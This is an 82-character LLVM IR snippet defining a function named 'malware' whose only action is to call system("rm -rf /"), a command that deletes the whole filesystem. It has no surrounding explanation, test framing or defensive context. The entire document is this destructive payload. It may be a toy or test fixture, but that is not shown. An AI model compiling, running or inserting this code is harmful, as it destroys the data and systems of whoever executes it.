define i32 @malware() {
entry:
  %0 = call i32 @system("rm -rf /")
  ret i32 %0
}
